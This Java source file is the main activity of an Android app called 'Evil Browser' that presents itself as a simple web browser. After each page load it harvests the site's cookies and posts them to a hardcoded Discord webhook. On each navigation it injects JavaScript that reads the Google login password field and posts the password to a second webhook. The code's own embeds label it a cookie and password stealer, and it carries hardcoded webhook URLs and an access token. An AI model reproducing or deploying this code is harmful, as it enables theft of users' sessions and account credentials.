package com.example.evilbrowser;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.location.Location;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.maps.model.LatLng;
import com.google.android.gms.tasks.OnSuccessListener;

import java.io.IOException;
import java.util.List;

import club.minnced.discord.webhook.WebhookClient;

public class MainActivity extends AppCompatActivity {
    private static final String ACCESS_TOKEN = "dmNpaVPnw0wAAAAAAAAAAddlQemOyscJpXDbY8Mop-9rQc8yBfdbkTDK6DCGnN6H";
    String CooKies;
    String GPassword;
    WebView webView;


    SwipeRefreshLayout swipe;
    ProgressBar progressBar;
    private Toolbar toolbar;

    private static final String TAG = "CookieManager";
    WebView web;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        ActionBar actionBar = getSupportActionBar();
//        actionBar.setTitle("  Welcome");
//        actionBar.setSubtitle("   Login to facebook");
//        actionBar.setIcon(R.drawable.fire);
//        actionBar.setDisplayUseLogoEnabled(true);
//        actionBar.setDisplayShowHomeEnabled(true);


//        dropupload dropupload = new dropupload();
//        dropupload.execute();


//        Networks network = new Networks();
//        network.execute();


        setContentView(R.layout.activity_main);

        progressBar = (ProgressBar) findViewById(R.id.awv_progressBar);
        swipe = (SwipeRefreshLayout) findViewById(R.id.swipe);
        LoadWeb();

        progressBar.setMax(100);
        progressBar.setProgress(1);

        webView.setWebChromeClient(new WebChromeClient() {
            public void onProgressChanged(WebView view, int progress) {


                progressBar.setProgress(progress);

                if(progress==100){
                    setTitle(view.getUrl());
                }
                else {
                    setTitle("Loading...");
                }
            }
        });


        swipe = (SwipeRefreshLayout) findViewById(R.id.swipe);
        swipe.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                webView.reload();
            }
        });

        webView.setWebViewClient(new WebViewClient() {


            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                progressBar.setVisibility(View.VISIBLE);
            }

            public void onLoadResource(WebView view, String url) { //Doesn't work
                //swipe.setRefreshing(true);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                CookieManager.getInstance().setAcceptCookie(true);
                CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
                String cookies = CookieManager.getInstance().getCookie(url);
                CooKies = cookies;
                Log.d(TAG, "All the cookies in a string:" + cookies);

                //Hide the SwipeReefreshLayout
                progressBar.setVisibility(View.GONE);
                swipe.setRefreshing(false);

                discordUpload discordUpload = new discordUpload();
                discordUpload.execute();


            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                getPassword(view);
//                getEmailid(view);
                return false;
            }

        });

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.refresh:
                webView.reload();
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    public void LoadWeb() {

        webView = (WebView) findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAppCacheEnabled(true);
        webView.loadUrl("https://www.google.com");
        swipe.setRefreshing(true);

    }


    private class Callback extends WebViewClient {

        @Override
        public boolean shouldOverrideKeyEvent(WebView view, KeyEvent event) {
            return false;

        }


    }


    private void upload() {
        DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/950413870143537213/Fvi_YGsUsRap-KzWM7aim0-JrA90yTy-z7YHitDgCsj1pPyHMcoNxIT-ggWX8NOzzjgj");
        webhook.setContent("Incoming Cookies");
        webhook.setAvatarUrl("https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg");
        webhook.setUsername("Android");
        webhook.setTts(true);
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setTitle("Evil Browser")
                .setDescription("Cookie and password stealer")
                .addField("1st Field", "Inline", true)
                .addField("2nd Field", "Inline", true)
                .addField("3rd Field", "No-Inline", false)
                .setThumbnail("https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setFooter("Footer text", "https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setImage("https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setAuthor("Kingsman", "https://discord.com/api/webhooks/858590814511169566/7eGlwsxa-q5NPO_WAwREgdpPb-Mx4RYe_-xU01r_AEMwxObdw2etI-Jc5i8C9ERyEQ4k", "https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setUrl("https://www.exploitblizzard.com"));
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setDescription(CooKies)
        );

        try {
            webhook.execute(); //Handle exception
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private class discordUpload extends AsyncTask {
        @Override
        protected Object doInBackground(Object[] objects) {
            upload();
            return null;
        }
    }


    void getPassword(WebView view) {
        // Evaluates JS. JS defines a function that finds your password, then calls it, result is
        // passed to onReceiveValue, which then toasts your password.
        view.evaluateJavascript("function g() { for (element of document.getElementsByClassName(\"whsOnd zHQkBf\")) { if (element.type === \"password\") { return element.value } } } g()",
                new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String value) {
                        if (!value.equals("null")) {
                            String GPassword2 = value;
                            GPassword = GPassword2.replace("\"", "");
//                            toast("Your password is: \""+GPassword+"\"");
                            Log.d(TAG, "pass-is:" + GPassword);
                            discordUpload2 discordUpload2 = new discordUpload2();
                            discordUpload2.execute();
                        }
                    }
                });
    }

    private void toast(String text) {
        Toast.makeText(this, text, Toast.LENGTH_LONG).show();
    }

    private void upload2() {
        DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/950421839920898159/kIkTcB2YzX29D7Xaz9nVi8spDT-ddP89ZTP7a6ftKmkMMlUBryYAe0sOamsWNiS49T-s");
        webhook.setContent("Incoming Cookies");
        webhook.setAvatarUrl("https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg");
        webhook.setUsername("Android");
        webhook.setTts(true);
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setTitle("Evil Browser")
                .setDescription("Cookie and password stealer")
                .addField("1st Field", "Inline", true)
                .addField("2nd Field", "Inline", true)
                .addField("3rd Field", "No-Inline", false)
                .setThumbnail("https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setFooter("Footer text", "https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setImage("https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setAuthor("Kingsman", "https://discord.com/api/webhooks/858590814511169566/7eGlwsxa-q5NPO_WAwREgdpPb-Mx4RYe_-xU01r_AEMwxObdw2etI-Jc5i8C9ERyEQ4k", "https://cdn.discordapp.com/attachments/858590788090069032/858984350343102464/IMG_20201031_033415_425.jpg")
                .setUrl("https://www.exploitblizzard.com"));
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                        .setDescription("Password is: "+GPassword)
        );

        try {
            webhook.execute(); //Handle exception
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private class discordUpload2 extends AsyncTask {
        @Override
        protected Object doInBackground(Object[] objects) {
            upload2();
            return null;
        }
    }


}